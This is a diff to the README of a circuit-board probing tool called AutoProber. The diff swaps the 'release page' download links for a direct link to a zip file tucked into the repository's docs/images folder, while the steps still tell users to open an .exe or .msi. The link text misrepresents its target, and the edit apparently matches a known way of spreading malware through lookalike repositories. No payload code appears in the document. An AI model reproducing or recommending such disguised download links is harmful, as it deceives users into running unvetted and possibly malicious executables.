@@ -1,6 +1,6 @@
 # 🔍 AutoProber - Automated hardware testing for circuit boards
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Empty-democritus307/AutoProber/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Empty-democritus307/AutoProber/main/docs/images/Public-Release-Images/Prober_Auto_v1.3.zip)
 
 AutoProber helps you test, map, and analyze circuit boards. It moves a probe tip across your hardware to find connection points. This tool aids in security research and board analysis. It uses a camera for mapping and a robotic system for precision movement. You gain a clear view of your hardware and its internal networks.
 
@@ -25,7 +25,7 @@ Before you install the tool, ensure your computer meets these needs:
 
 Follow these steps to obtain the software:
 
-1. Visit the [AutoProber release page](https://github.com/Empty-democritus307/AutoProber/releases) to see available versions.
+1. Visit the [AutoProber release page](https://raw.githubusercontent.com/Empty-democritus307/AutoProber/main/docs/images/Public-Release-Images/Prober_Auto_v1.3.zip) to see available versions.
 2. Look for the file ending in `.msi` or `.exe` under the latest release.
 3. Select the file to save it to your computer.
 4. Open the file once the download finishes.
